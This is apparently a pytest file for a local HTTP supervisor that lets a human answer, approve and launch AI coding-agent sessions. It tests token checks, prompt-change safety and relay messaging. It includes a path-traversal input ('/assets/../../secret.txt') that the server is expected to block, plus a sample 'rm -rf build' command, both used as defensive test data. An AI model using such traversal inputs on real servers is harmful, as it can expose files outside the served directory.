"""Tests for the supervisor HTTP server and collector (GH-1692)."""

from __future__ import annotations

import http.client
import json
import threading
from collections.abc import Iterator
from dataclasses import dataclass, replace
from datetime import date, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest

from dev10x.comm.skills.bus.maildir import mailbox_unread, read_message
from dev10x.comm.supervisor import server as server_module
from dev10x.comm.supervisor.decisions import ANSWERED, DELIVERED, OPEN, DecisionStore
from dev10x.comm.supervisor.history import PastSession
from dev10x.comm.supervisor.launcher import Checkout, Launched, LaunchError, Project
from dev10x.comm.supervisor.paths import TOKEN_HEADER
from dev10x.comm.supervisor.pending import ConversationEntry, Preview, RecentTool
from dev10x.comm.supervisor.probes import ProbeError, Snapshot
from dev10x.comm.supervisor.server import (
    MAX_BODY_BYTES,
    SupervisorApp,
    make_server,
    refresh,
    rename_defaults,
    run_collector,
    snapshot_payload,
)
from dev10x.comm.supervisor.sessions import SessionView
from dev10x.comm.supervisor.workspace import Workspace
from tests.comm.supervisor.conftest import NOW

TOKEN = "tok-123"
HOOK_TOKEN = "hook-456"
RELAY = "supervisor-relay"
WAITING = SessionView(
    session_id="sid-wait",
    name="kb-84",
    cwd="/kb",
    status="waiting",
    waiting_for="input needed",
    pane_id="w3:p1",
    callsign="",
    summary="",
    board_state="",
    group="needs-you",
)
IDLE = replace(
    WAITING,
    session_id="sid-idle",
    name="mc-updates",
    status="idle",
    waiting_for="",
    pane_id="w12:p1",
    group="done",
)
PERMISSION = replace(
    WAITING, session_id="sid-perm", name="perms", waiting_for="permission prompt", pane_id="w5:p1"
)
QUESTION = {
    "question": "Which hub?",
    "header": "Hub",
    "options": [{"label": "Relay"}, {"label": "mc"}],
}
PROMPT_TEXT = " Do you want to proceed?\n ❯ 1. Yes\n   2. Yes, and don't ask again\n   3. No\n"
PREVIEWS = {
    "sid-perm": Preview(tool="Bash", title="Clean the build", kind="command", body="rm -rf build")
}
COMMANDS = {"sid-perm": ["git status", "rm -rf build"], "sid-idle": ["ls"]}
RECENT = {
    "sid-perm": [
        RecentTool(tool="Bash", target="rm -rf build", outcome="pending", command="rm -rf build"),
        RecentTool(tool="Edit", target="/kb/a.md", outcome="ran"),
    ]
}
CONVERSATION = {
    "sid-perm": [
        ConversationEntry(role="user", kind="text", text="Clean up", at="2026-10-31T20:00:00Z")
    ]
}
WORKSPACES = {
    "/kb": Workspace(
        project="Dev10x-Claude",
        root="/kb",
        branch="janusz/GH-1722/bar",
        issue="GH-1722",
        repo_url="https://github.com/Dev10x-Guru/Dev10x-Claude",
    )
}
WIDGET_TEXT = "Which hub?\n❯ 1. Relay\n  2. mc\n"
PANES = {"w3:p1": WIDGET_TEXT, "w5:p1": PROMPT_TEXT, "w12:p1": ""}
SOON = datetime.now().astimezone() + timedelta(minutes=5)


class KeySender:
    def __init__(self) -> None:
        self.calls: list[dict[str, Any]] = []
        self.error: Exception | None = None

    def __call__(self, **kwargs: Any) -> None:
        self.calls.append(kwargs)
        if self.error:
            raise self.error


@dataclass
class Response:
    status: int
    body: bytes
    headers: dict[str, str]

    def json(self) -> Any:
        return json.loads(self.body)


@pytest.fixture
def keys() -> KeySender:
    return KeySender()


@pytest.fixture
def panes() -> dict[str, str]:
    return dict(PANES)


@pytest.fixture
def static_dir(tmp_path: Path) -> Path:
    root = tmp_path / "static"
    (root / "assets").mkdir(parents=True)
    (root / "index.html").write_text("<!doctype html><title>Supervisor</title>")
    (root / "assets" / "app.js").write_text("console.log(1)")
    (tmp_path / "secret.txt").write_text("nope")
    return root


@pytest.fixture
def app(tmp_path: Path, keys: KeySender, panes: dict[str, str], static_dir: Path) -> SupervisorApp:
    supervisor = SupervisorApp(
        store=DecisionStore(path=tmp_path / "decisions.json"),
        bus_root=tmp_path / "bus",
        kb_root=tmp_path / "kb",
        log_path=tmp_path / "actions.jsonl",
        token=TOKEN,
        hook_token=HOOK_TOKEN,
        relay_mailbox=RELAY,
        key_sender=keys,
        pane_reader=lambda pane_id, lines=0, source="", ansi=False: panes[pane_id],
        preview_reader=lambda session_id: PREVIEWS.get(session_id),
        commands_reader=lambda session_id: COMMANDS.get(session_id, []),
        recent_reader=lambda session_id: RECENT.get(session_id, []),
        conversation_reader=lambda session_id: CONVERSATION.get(session_id, []),
        workspace_reader=lambda cwd: WORKSPACES.get(cwd, Workspace(project=cwd, root=cwd)),
        today=lambda: date(2026, 10, 31),
        static_dir=static_dir,
    )
    supervisor.publish(
        snapshot=Snapshot(sessions=[WAITING, IDLE, PERMISSION], taken_at=NOW),
        pane_text={"sid-wait": PANES["w3:p1"], "sid-perm": PROMPT_TEXT},
    )
    return supervisor


@pytest.fixture
def port(app: SupervisorApp) -> Iterator[int]:
    server = make_server(app=app, port=0)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield server.server_address[1]
    app.stop()
    server.shutdown()
    server.server_close()


def call(
    *,
    port: int,
    method: str,
    path: str,
    payload: Any = None,
    token: str | None = TOKEN,
    raw: bytes | None = None,
    content_type: str = "application/json",
) -> Response:
    headers: dict[str, str] = {"Content-Type": content_type}
    if token is not None:
        headers[TOKEN_HEADER] = token
    body = raw if payload is None else json.dumps(payload).encode()
    connection = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
    try:
        connection.request(method, path, body=body, headers=headers)
        response = connection.getresponse()
        return Response(
            status=response.status, body=response.read(), headers=dict(response.getheaders())
        )
    finally:
        connection.close()


def add_decision(*, app: SupervisorApp, session_id: str) -> str:
    [decision] = app.store.add_from_hook(session_id=session_id, cwd="/w", questions=[QUESTION])
    return decision.decision_id


class TestAuth:
    @pytest.mark.parametrize("path", ["/", "/api/sessions", "/api/events", "/lessons"])
    def test_get_requires_token(self, port: int, path: str) -> None:
        assert call(port=port, method="GET", path=path, token=None).status == 403

    @pytest.mark.parametrize(
        "path", ["/decisions", "/answer", "/keys", "/reply", "/preapprove", "/lessons"]
    )
    def test_post_without_token_forbidden(self, port: int, path: str) -> None:
        assert call(port=port, method="POST", path=path, payload={}, token=None).status == 403

    def test_wrong_token_forbidden(self, port: int) -> None:
        response = call(port=port, method="GET", path="/", token="nope")

        assert (response.status, response.json()) == (403, {"error": "missing or wrong token"})

    def test_token_in_query(self, port: int) -> None:
        assert call(port=port, method="GET", path=f"/?token={TOKEN}", token=None).status == 200

    def test_hook_token_may_post_decisions(self, port: int) -> None:
        response = call(
            port=port,
            method="POST",
            path="/decisions",
            payload={"session_id": "s", "questions": [QUESTION]},
            token=HOOK_TOKEN,
        )

        assert response.status == 201

    @pytest.mark.parametrize(
        ("method", "path"),
        [("GET", "/"), ("GET", "/api/sessions"), ("POST", "/keys"), ("POST", "/answer")],
    )
    def test_hook_token_opens_nothing_else(self, port: int, method: str, path: str) -> None:
        response = call(port=port, method=method, path=path, payload={}, token=HOOK_TOKEN)

        assert response.status == 403

    def test_unknown_route(self, port: int) -> None:
        assert call(port=port, method="GET", path="/nope").status == 404


class TestStatic:
    def test_page_serves_the_built_index(self, port: int) -> None:
        response = call(port=port, method="GET", path="/")

        assert (response.status, b"<title>Supervisor</title>" in response.body) == (200, True)

    def test_page_without_build(self, port: int, static_dir: Path) -> None:
        (static_dir / "index.html").unlink()

        response = call(port=port, method="GET", path="/")

        assert (response.status, "pnpm build" in response.json()["error"]) == (503, True)

    def test_asset_needs_no_token(self, port: int) -> None:
        response = call(port=port, method="GET", path="/assets/app.js", token=None)

        assert (response.status, response.headers["Content-Type"], response.body) == (
            200,
            "text/javascript",
            b"console.log(1)",
        )

    @pytest.mark.parametrize("path", ["/assets/missing.js", "/assets/../../secret.txt"])
    def test_asset_outside_or_missing(self, port: int, path: str) -> None:
        assert call(port=port, method="GET", path=path, token=None).status == 404


class TestSnapshotPayload:
    @pytest.fixture
    def sessions(self, app: SupervisorApp) -> dict[str, dict[str, Any]]:
        add_decision(app=app, session_id=WAITING.session_id)
        return {item["session_id"]: item for item in snapshot_payload(app=app)["sessions"]}

    def test_prompt_options_parsed_for_waiting_sessions(
        self,
        sessions: dict[str, dict[str, Any]],
    ) -> None:
        assert [
            (option["key"], option["label"])
            for option in sessions["sid-perm"]["prompt"]["options"]
        ] == [("1", "Yes"), ("2", "Yes, and don't ask again"), ("3", "No")]

    def test_no_prompt_for_a_session_that_is_not_waiting(
        self,
        sessions: dict[str, dict[str, Any]],
    ) -> None:
        assert sessions["sid-idle"]["prompt"] is None

    def test_decisions_attached_to_their_session(
        self,
        sessions: dict[str, dict[str, Any]],
    ) -> None:
        assert [len(sessions[sid]["decisions"]) for sid in ("sid-wait", "sid-idle")] == [1, 0]

    def test_excerpt_trims_trailing_blank_lines(self, app: SupervisorApp) -> None:
        app.publish(snapshot=app.snapshot, pane_text={"sid-wait": "a\nb  \n\n\n"})

        [first] = [
            s for s in snapshot_payload(app=app)["sessions"] if s["session_id"] == "sid-wait"
        ]

        assert first["excerpt"] == "a\nb"


class TestApiAndEvents:
    def test_api_returns_snapshot(self, port: int) -> None:
        payload = call(port=port, method="GET", path="/api/sessions").json()

        assert ([s["name"] for s in payload["sessions"]], payload["errors"]) == (
            ["kb-84", "mc-updates", "perms"],
            {},
        )

    def test_events_stream_sends_snapshot_then_updates(
        self,
        port: int,
        app: SupervisorApp,
    ) -> None:
        connection = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
        connection.request("GET", f"/api/events?token={TOKEN}")
        response = connection.getresponse()
        first = response.fp.readline() + response.fp.readline()
        response.fp.readline()
        app.publish(snapshot=Snapshot(sessions=[IDLE], taken_at=NOW), pane_text={})
        response.fp.readline()
        second = json.loads(response.fp.readline().removeprefix(b"data: "))
        app.stop()
        connection.close()

        assert (
            response.headers["Content-Type"],
            first.startswith(b"event: snapshot\ndata: {"),
            [s["name"] for s in second["sessions"]],
        ) == ("text/event-stream", True, ["mc-updates"])

    def test_events_heartbeat(self, port: int, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(server_module, "HEARTBEAT_SECONDS", 0.05)
        connection = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
        connection.request("GET", f"/api/events?token={TOKEN}")
        response = connection.getresponse()
        for _ in range(3):
            response.fp.readline()
        ping = response.fp.readline()
        connection.close()

        assert ping == b": ping\n"

    def test_events_end_on_stop(self, app: SupervisorApp) -> None:
        app.stop()
        handler = _bare_handler(app=app)

        handler._events({})

        assert handler.wfile.getvalue().endswith(b"\r\n\r\n")

    def test_events_survive_a_dropped_client(self, app: SupervisorApp) -> None:
        handler = _bare_handler(app=app, broken=True)

        assert handler._events({}) is None


def _bare_handler(*, app: SupervisorApp, broken: bool = False) -> Any:
    import io

    class Writer(io.BytesIO):
        def write(self, data: bytes) -> int:  # type: ignore[override]
            if broken and data.startswith(b"event:"):
                raise BrokenPipeError
            return super().write(data)

    handler = server_module.SupervisorHandler.__new__(server_module.SupervisorHandler)
    handler.server = type("S", (), {"app": app})()  # type: ignore[assignment]
    handler.wfile = Writer()
    handler.request_version = "HTTP/1.1"
    handler.requestline = "GET /api/events HTTP/1.1"
    handler.command = "GET"
    handler.client_address = ("127.0.0.1", 0)
    return handler


class TestDecisions:
    def test_post_decisions_then_snapshot_lists_them(self, port: int) -> None:
        created = call(
            port=port,
            method="POST",
            path="/decisions",
            payload={"session_id": WAITING.session_id, "cwd": "/kb", "questions": [QUESTION]},
        )
        sessions = call(port=port, method="GET", path="/api/sessions").json()["sessions"]

        assert (created.status, sessions[0]["decisions"][0]["options"]) == (201, ["Relay", "mc"])

    @pytest.mark.parametrize(
        "payload",
        [{"questions": []}, {"session_id": "x", "questions": "nope"}],
        ids=["no-session", "questions-not-list"],
    )
    def test_post_decisions_validates(self, port: int, payload: dict[str, Any]) -> None:
        assert call(port=port, method="POST", path="/decisions", payload=payload).status == 400

    def test_post_needs_json(self, port: int) -> None:
        response = call(
            port=port,
            method="POST",
            path="/decisions",
            raw=b"a=b",
            content_type="application/x-www-form-urlencoded",
        )

        assert response.status == 400

    @pytest.mark.parametrize("raw", [b"{bad", b"[1]"], ids=["bad-json", "not-object"])
    def test_post_bad_json(self, port: int, raw: bytes) -> None:
        assert call(port=port, method="POST", path="/decisions", raw=raw).status == 400

    @pytest.mark.parametrize("length", ["-1", "lots"])
    def test_bad_content_length(self, port: int, length: str) -> None:
        connection = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
        connection.putrequest("POST", "/decisions")
        connection.putheader(TOKEN_HEADER, TOKEN)
        connection.putheader("Content-Type", "application/json")
        connection.putheader("Content-Length", length)
        connection.endheaders()
        status = connection.getresponse().status
        connection.close()

        assert status == 400

    def test_internal_error_answers_500(
        self,
        port: int,
        app: SupervisorApp,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        def broken() -> list[Any]:
            raise RuntimeError("store exploded")

        monkeypatch.setattr(app.store, "all", broken)

        response = call(port=port, method="GET", path="/api/sessions")

        assert (response.status, "internal error" in response.json()["error"]) == (500, True)

    def test_body_too_large(self, port: int) -> None:
        response = call(
            port=port, method="POST", path="/decisions", raw=b"x" * (MAX_BODY_BYTES + 1)
        )

        assert response.status == 413


class TestAnswerSafety:
    def test_refuses_when_another_question_is_on_screen(
        self,
        port: int,
        app: SupervisorApp,
        keys: KeySender,
        panes: dict[str, str],
    ) -> None:
        panes["w3:p1"] = "Ship it?\n❯ 1. Yes\n  2. Not yet\n"
        decision_id = add_decision(app=app, session_id=WAITING.session_id)

        response = call(
            port=port,
            method="POST",
            path="/answer",
            payload={"decision_id": decision_id, "option_index": 0},
        )
        stored = app.store.get(decision_id=decision_id)

        assert (response.status, keys.calls, stored and stored.state) == (409, [], OPEN)

    def test_relay_failure_reopens_the_decision(self, port: int, app: SupervisorApp) -> None:
        app.relay_mailbox = "not a mailbox!"
        decision_id = add_decision(app=app, session_id=IDLE.session_id)

        response = call(
            port=port,
            method="POST",
            path="/answer",
            payload={"decision_id": decision_id, "option_index": 0},
        )
        stored = app.store.get(decision_id=decision_id)

        assert (response.status, stored and stored.state) == (502, OPEN)


class TestAnswer:
    def test_waiting_session_sends_keys(
        self,
        port: int,
        app: SupervisorApp,
        keys: KeySender,
    ) -> None:
        decision_id = add_decision(app=app, session_id=WAITING.session_id)

        response = call(
            port=port,
            method="POST",
            path="/answer",
            payload={"decision_id": decision_id, "option_index": 1},
        )
        stored = app.store.get(decision_id=decision_id)

        assert (
            response.json(),
            keys.calls,
            stored and (stored.state, stored.answer, stored.channel),
        ) == (
            {"ok": True, "channel": "keys"},
            [{"pane_id": "w3:p1", "keys": ["2"]}],
            (ANSWERED, "mc", "keys"),
        )

    def test_idle_session_relays(self, port: int, app: SupervisorApp, keys: KeySender) -> None:
        decision_id = add_decision(app=app, session_id=IDLE.session_id)

        response = call(
            port=port,
            method="POST",
            path="/answer",
            payload={"decision_id": decision_id, "option_index": 0},
        )
        [message] = mailbox_unread(root=app.bus_root, name=RELAY)
        headers, body = read_message(message=message)

        assert (response.json()["channel"], keys.calls, headers["to-session"], body.strip()) == (
            "relay",
            [],
            "mc-updates",
            "Answer from Janusz: Relay",
        )

    def test_vanished_session_conflicts(
        self,
        port: int,
        app: SupervisorApp,
        keys: KeySender,
    ) -> None:
        decision_id = add_decision(app=app, session_id="gone")

        response = call(
            port=port,
            method="POST",
            path="/answer",
            payload={"decision_id": decision_id, "option_index": 0},
        )

        assert (response.status, keys.calls, (app.bus_root / RELAY).exists()) == (409, [], False)

    def test_answer_twice_conflicts(
        self,
        port: int,
        app: SupervisorApp,
        keys: KeySender,
    ) -> None:
        decision_id = add_decision(app=app, session_id=WAITING.session_id)
        payload = {"decision_id": decision_id, "option_index": 0}

        call(port=port, method="POST", path="/answer", payload=payload)
        second = call(port=port, method="POST", path="/answer", payload=payload)

        assert (second.status, second.json(), len(keys.calls)) == (
            409,
            {"error": "Already answered."},
            1,
        )

    @pytest.mark.parametrize("option_index", ["x", 5, -1, None])
    def test_bad_option_index(self, port: int, app: SupervisorApp, option_index: Any) -> None:
        decision_id = add_decision(app=app, session_id=WAITING.session_id)

        response = call(
            port=port,
            method="POST",
            path="/answer",
            payload={"decision_id": decision_id, "option_index": option_index},
        )

        assert response.status == 400

    def test_failed_keys_reopen_decision(
        self,
        port: int,
        app: SupervisorApp,
        keys: KeySender,
    ) -> None:
        keys.error = ProbeError("herdr exited 1")
        decision_id = add_decision(app=app, session_id=WAITING.session_id)

        response = call(
            port=port,
            method="POST",
            path="/answer",
            payload={"decision_id": decision_id, "option_index": 0},
        )
        stored = app.store.get(decision_id=decision_id)

        assert (response.status, stored and stored.state) == (502, OPEN)

    @pytest.mark.parametrize("session", [WAITING, IDLE], ids=["keys", "relay"])
    def test_lost_race_conflicts(
        self,
        port: int,
        app: SupervisorApp,
        keys: KeySender,
        monkeypatch: pytest.MonkeyPatch,
        session: SessionView,
    ) -> None:
        decision_id = add_decision(app=app, session_id=session.session_id)
        monkeypatch.setattr(app.store, "answer", lambda **_: None)

        response = call(
            port=port,
            method="POST",
            path="/answer",
            payload={"decision_id": decision_id, "option_index": 0},
        )

        assert (response.status, keys.calls, (app.bus_root / RELAY).exists()) == (409, [], False)


class TestKeys:
    @pytest.mark.parametrize(("key", "label"), [("1", "Yes"), ("3", "No")])
    def test_sends_a_listed_option(
        self,
        port: int,
        keys: KeySender,
        key: str,
        label: str,
    ) -> None:
        response = call(
            port=port,
            method="POST",
            path="/keys",
            payload={"session_id": PERMISSION.session_id, "key": key, "label": label},
        )

        assert (response.json(), keys.calls) == (
            {"ok": True, "sent": key},
            [{"pane_id": "w5:p1", "keys": [key]}],
        )

    def test_refuses_when_the_prompt_changed(
        self,
        port: int,
        keys: KeySender,
        panes: dict[str, str],
    ) -> None:
        panes["w5:p1"] = " Allow edit?\n ❯ 1. Allow\n   2. Deny\n"

        response = call(
            port=port,
            method="POST",
            path="/keys",
            payload={"session_id": PERMISSION.session_id, "key": "1", "label": "Yes"},
        )

        assert (response.status, "Nothing was sent" in response.json()["error"], keys.calls) == (
            409,
            True,
            [],
        )

    def test_refuses_a_session_that_is_not_waiting(self, port: int, keys: KeySender) -> None:
        response = call(
            port=port,
            method="POST",
            path="/keys",
            payload={"session_id": IDLE.session_id, "key": "1", "label": "Yes"},
        )

        assert (response.status, keys.calls) == (409, [])

    def test_failure_reported(self, port: int, keys: KeySender) -> None:
        keys.error = ProbeError("herdr exited 1")

        response = call(
            port=port,
            method="POST",
            path="/keys",
            payload={"session_id": PERMISSION.session_id, "key": "1", "label": "Yes"},
        )

        assert (response.status, response.json()["error"]) == (502, "herdr exited 1")


PROJECT = Project(
    root="/kb",
    name="KB",
    main_workspace_id="w1",
    checkouts=[
        Checkout(path="/kb", branch="main", is_main=True, workspace_id="w1"),
        Checkout(path="/kb-wt", branch="janusz/GH-1/x", is_main=False),
    ],
)
PAST = [
    PastSession(
        session_id="sid-old",
        cwd="/kb-wt",
        title="GH-1-x",
        topic="Fix x",
        active_at="2026-10-30T10:00:00+00:00",
        named=True,
    )
]


class Launcher:
    def __init__(self, *, error: Exception | None = None) -> None:
        self.calls: list[dict[str, Any]] = []
        self.error = error

    def __call__(self, **kwargs: Any) -> Launched:
        self.calls.append(kwargs)
        if self.error:
            raise self.error
        return Launched(pane_id="w9:p1", agent="x-beef", path=kwargs.get("path", "/wt/new"))


class TestProjectActions:
    @pytest.fixture
    def launcher(self, app: SupervisorApp) -> Launcher:
        launcher = Launcher()
        app.publish(snapshot=Snapshot(sessions=[IDLE]), pane_text={}, workspaces=WORKSPACES)
        app.project_reader = lambda root: PROJECT
        app.past_reader = lambda checkouts, running: PAST
        app.opener = launcher
        app.worktree_maker = launcher
        return launcher

    def test_project_lists_checkouts_and_past_sessions(
        self, port: int, launcher: Launcher
    ) -> None:
        response = call(port=port, method="GET", path="/api/project?root=/kb")

        assert response.json() == {
            "root": "/kb",
            "name": "KB",
            "checkouts": [
                {"path": "/kb", "branch": "main", "is_main": True, "open": True},
                {"path": "/kb-wt", "branch": "janusz/GH-1/x", "is_main": False, "open": False},
            ],
            "past": [
                {
                    "session_id": "sid-old",
                    "cwd": "/kb-wt",
                    "title": "GH-1-x",
                    "topic": "Fix x",
                    "active_at": "2026-10-30T10:00:00+00:00",
                    "named": True,
                }
            ],
        }

    @pytest.mark.parametrize("root", ["", "/etc"])
    def test_only_known_projects(self, port: int, launcher: Launcher, root: str) -> None:
        response = call(port=port, method="GET", path=f"/api/project?root={root}")

        assert response.status == 400

    def test_herdr_failure_reading_the_project(
        self, port: int, app: SupervisorApp, launcher: Launcher
    ) -> None:
        def broken(root: str) -> Project:
            raise LaunchError("herdr is not installed or not on PATH")

        app.project_reader = broken

        response = call(port=port, method="GET", path="/api/project?root=/kb")

        assert response.status == 502

    @pytest.mark.parametrize(
        ("body", "expected"),
        [
            ({"action": "session"}, {"project": PROJECT, "path": "/kb"}),
            ({"action": "session", "path": "/kb-wt"}, {"project": PROJECT, "path": "/kb-wt"}),
            (
                {"action": "worktree", "branch": " janusz/GH-2/y "},
                {"project": PROJECT, "branch": "janusz/GH-2/y"},
            ),
            (
                {"action": "resume", "session_id": "sid-old"},
                {"project": PROJECT, "path": "/kb-wt", "resume": "sid-old"},
            ),
        ],
        ids=["main-folder", "worktree-folder", "new-worktree", "resume"],
    )
    def test_launch(
        self,
        port: int,
        app: SupervisorApp,
        launcher: Launcher,
        body: dict[str, Any],
        expected: dict[str, Any],
    ) -> None:
        response = call(port=port, method="POST", path="/launch", payload={"root": "/kb", **body})
        record = json.loads(app.log_path.read_text(encoding="utf-8").splitlines()[-1])

        assert (response.json()["ok"], launcher.calls, record["action"]) == (
            True,
            [expected],
            f"launch-{body['action']}",
        )

    def test_resume_unknown_session(self, port: int, launcher: Launcher) -> None:
        response = call(
            port=port,
            method="POST",
            path="/launch",
            payload={"root": "/kb", "action": "resume", "session_id": "sid-live"},
        )

        assert (response.status, launcher.calls) == (409, [])

    def test_unknown_action(self, port: int, launcher: Launcher) -> None:
        response = call(
            port=port, method="POST", path="/launch", payload={"root": "/kb", "action": "x"}
        )

        assert response.status == 400

    def test_launch_failure_reported(
        self, port: int, app: SupervisorApp, launcher: Launcher
    ) -> None:
        app.opener = Launcher(error=LaunchError("herdr tab create failed: no shell"))

        response = call(
            port=port, method="POST", path="/launch", payload={"root": "/kb", "action": "session"}
        )

        assert (response.status, response.json()["error"]) == (
            502,
            "herdr tab create failed: no shell",
        )


class Renamer:
    def __init__(self, *, fail_on: str = "") -> None:
        self.calls: list[dict[str, Any]] = []
        self.fail_on = fail_on

    def __call__(self, **kwargs: Any) -> None:
        self.calls.append(kwargs)
        if kwargs["session_name"] == self.fail_on:
            raise ProbeError("herdr refused the prompt")


class TestRename:
    @pytest.fixture
    def renamer(self, app: SupervisorApp) -> Renamer:
        renamer = Renamer()
        app.renamer = renamer
        return renamer

    def test_submits_rename_to_an_idle_session(self, port: int, renamer: Renamer) -> None:
        response = call(
            port=port,
            method="POST",
            path="/rename",
            payload={"session_id": IDLE.session_id, "name": " status-bar "},
        )

        assert (response.json(), [(c["pane_id"], c["name"]) for c in renamer.calls]) == (
            {"ok": True, "name": "status-bar"},
            [("w12:p1", "status-bar")],
        )

    @pytest.mark.parametrize("name", ["", "has space", "-lead", "x" * 65])
    def test_rejects_a_bad_name(self, port: int, renamer: Renamer, name: str) -> None:
        response = call(
            port=port,
            method="POST",
            path="/rename",
            payload={"session_id": IDLE.session_id, "name": name},
        )

        assert (response.status, renamer.calls) == (400, [])

    def test_waits_for_an_idle_session(self, port: int, renamer: Renamer) -> None:
        response = call(
            port=port,
            method="POST",
            path="/rename",
            payload={"session_id": WAITING.session_id, "name": "ok-name"},
        )

        assert (response.status, renamer.calls) == (409, [])

    def test_herdr_failure_reported(self, port: int, app: SupervisorApp) -> None:
        app.renamer = Renamer(fail_on="mc-updates")

        response = call(
            port=port,
            method="POST",
            path="/rename",
            payload={"session_id": IDLE.session_id, "name": "ok-name"},
        )

        assert (response.status, response.json()["error"]) == (502, "herdr refused the prompt")


class TestRenameDefaults:
    GENERATED = replace(IDLE, name="kb-2a", cwd="/kb")
    OTHER = replace(IDLE, session_id="sid-other", name="kb-3b", cwd="/kb", pane_id="w9:p1")

    def test_renames_generated_names_after_the_branch(self, app: SupervisorApp) -> None:
        app.renamer = renamer = Renamer()
        app.publish(
            snapshot=Snapshot(sessions=[self.GENERATED]), pane_text={}, workspaces=WORKSPACES
        )

        done = rename_defaults(app=app)

        assert ([rename.name for rename in done], renamer.calls[0]["confirmed_by"]) == (
            ["GH-1722-bar"],
            "janusz (daemon start)",
        )

    def test_one_failure_does_not_stop_the_rest(self, app: SupervisorApp) -> None:
        app.renamer = Renamer(fail_on="kb-2a")
        workspaces = {
            "/kb": WORKSPACES["/kb"],
            "/kb2": replace(WORKSPACES["/kb"], root="/kb2", branch="janusz/GH-9/other"),
        }
        app.publish(
            snapshot=Snapshot(
                sessions=[self.GENERATED, replace(self.OTHER, name="kb2-3b", cwd="/kb2")]
            ),
            pane_text={},
            workspaces=workspaces,
        )

        assert [rename.name for rename in rename_defaults(app=app)] == ["GH-9-other"]

    def test_collector_renames_only_once(self, app: SupervisorApp) -> None:
        app.renamer = renamer = Renamer()
        app.auto_rename = True
        stop = threading.Event()
        ticks: list[int] = []

        def provider() -> Snapshot:
            ticks.append(1)
            if len(ticks) == 2:
                stop.set()
            return Snapshot(sessions=[self.GENERATED], taken_at=NOW)

        run_collector(app=app, interval=0, stop=stop, provider=provider)

        assert (len(ticks), [call["name"] for call in renamer.calls]) == (2, ["GH-1722-bar"])

    def test_collector_skips_renames_when_off(self, app: SupervisorApp) -> None:
        app.renamer = renamer = Renamer()
        stop = threading.Event()

        def provider() -> Snapshot:
            stop.set()
            return Snapshot(sessions=[self.GENERATED], taken_at=NOW)

        run_collector(app=app, interval=0, stop=stop, provider=provider)

        assert renamer.calls == []


class TestIntroduce:
    def test_mails_each_session_about_the_other(self, port: int, app: SupervisorApp) -> None:
        response = call(
            port=port,
            method="POST",
            path="/introduce",
            payload={"session_id": WAITING.session_id, "peer_id": IDLE.session_id},
        )
        mail = [
            read_message(message=path) for path in mailbox_unread(root=app.bus_root, name=RELAY)
        ]
        routes = sorted((headers["to-session"], headers["peer-session"]) for headers, _ in mail)

        assert (
            response.json(),
            routes,
            all(body.startswith("Answer from Janusz: ") for _, body in mail),
        ) == (
            {"ok": True, "request_id": "sid-wait-sid-idle"},
            [("kb-84", "mc-updates"), ("mc-updates", "kb-84")],
            True,
        )

    def test_describes_the_peer_from_its_workspace(self, port: int, app: SupervisorApp) -> None:
        app.publish(
            snapshot=Snapshot(sessions=[WAITING, replace(IDLE, cwd="/kb")], taken_at=NOW),
            pane_text={},
            status_lines={"sid-wait": "PR#1730"},
            workspaces=WORKSPACES,
        )

        call(
            port=port,
            method="POST",
            path="/introduce",
            payload={"session_id": IDLE.session_id, "peer_id": WAITING.session_id},
        )
        bodies = {
            headers["to-session"]: body
            for headers, body in (
                read_message(message=path)
                for path in mailbox_unread(root=app.bus_root, name=RELAY)
            )
        }

        assert (
            "on branch janusz/GH-1722/bar, for GH-1722, with PR "
            "https://github.com/Dev10x-Guru/Dev10x-Claude/pull/1730" in bodies["mc-updates"]
        )

    def test_same_session_rejected(self, port: int, app: SupervisorApp) -> None:
        response = call(
            port=port,
            method="POST",
            path="/introduce",
            payload={"session_id": IDLE.session_id, "peer_id": IDLE.session_id},
        )

        assert (response.status, (app.bus_root / RELAY).exists()) == (400, False)

    def test_gone_peer_conflicts(self, port: int) -> None:
        response = call(
            port=port,
            method="POST",
            path="/introduce",
            payload={"session_id": IDLE.session_id, "peer_id": "gone"},
        )

        assert response.status == 409

    def test_bus_failure_reported(
        self, port: int, app: SupervisorApp, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        def broken(**kwargs: Any) -> list[Path]:
            raise OSError("bus is read-only")

        monkeypatch.setattr(server_module, "introduce", broken)

        response = call(
            port=port,
            method="POST",
            path="/introduce",
            payload={"session_id": WAITING.session_id, "peer_id": IDLE.session_id},
        )

        assert (response.status, response.json()["error"]) == (502, "bus is read-only")


class TestReply:
    def test_relays_text(self, port: int, app: SupervisorApp) -> None:
        response = call(
            port=port,
            method="POST",
            path="/reply",
            payload={"session_id": IDLE.session_id, "text": " Go with B "},
        )
        [message] = mailbox_unread(root=app.bus_root, name=RELAY)

        assert (response.json(), read_message(message=message)[1].strip()) == (
            {"ok": True},
            "Answer from Janusz: Go with B",
        )

    def test_empty_rejected(self, port: int) -> None:
        response = call(
            port=port,
            method="POST",
            path="/reply",
            payload={"session_id": IDLE.session_id, "text": "  "},
        )

        assert response.status == 400

    def test_unknown_session_conflicts(self, port: int) -> None:
        response = call(
            port=port, method="POST", path="/reply", payload={"session_id": "gone", "text": "hi"}
        )

        assert (response.status, response.json()) == (409, {"error": "That session is gone."})


class TestPreapprove:
    def test_mails_the_relay_with_pending_call_and_commands(
        self,
        port: int,
        app: SupervisorApp,
    ) -> None:
        refresh(app=app, provider=lambda: Snapshot(sessions=[PERMISSION, IDLE], taken_at=NOW))

        response = call(
            port=port,
            method="POST",
            path="/preapprove",
            payload={"session_id": PERMISSION.session_id},
        )
        [message] = mailbox_unread(root=app.bus_root, name=RELAY)
        headers, body = read_message(message=message)
        request = json.loads(body)

        assert (
            response.json()["commands"],
            headers["subject"].startswith("preapprove sid-perm-"),
            request["pending"]["body"],
            request["commands"],
        ) == (2, True, "rm -rf build", ["git status", "rm -rf build"])

    def test_commands_alone_are_enough(self, port: int, app: SupervisorApp) -> None:
        response = call(
            port=port, method="POST", path="/preapprove", payload={"session_id": IDLE.session_id}
        )

        assert (response.status, response.json()["commands"]) == (200, 1)

    def test_nothing_to_preapprove(self, port: int, app: SupervisorApp) -> None:
        response = call(
            port=port,
            method="POST",
            path="/preapprove",
            payload={"session_id": WAITING.session_id},
        )

